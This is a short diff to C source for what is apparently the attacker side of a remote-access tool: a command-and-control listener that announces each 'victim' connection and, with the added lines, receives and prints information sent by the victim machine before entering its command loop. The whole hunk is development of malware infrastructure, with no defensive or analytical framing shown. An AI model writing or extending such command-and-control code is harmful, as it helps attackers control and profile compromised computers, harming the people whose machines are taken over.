@@ -45,6 +45,11 @@ int main() {
     if (client_fd < 0) { perror("accept"); exit(1); }
     printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));
 
+    // Print client info upon first time connecting
+    char* client_info = safe_recv_payload(client_fd, NULL, 0);
+    printf("%s", client_info);
+    free(client_info);
+
     // Main loop
     while(1) {
         char buf[C2_BUF_SIZE], cmd[5];
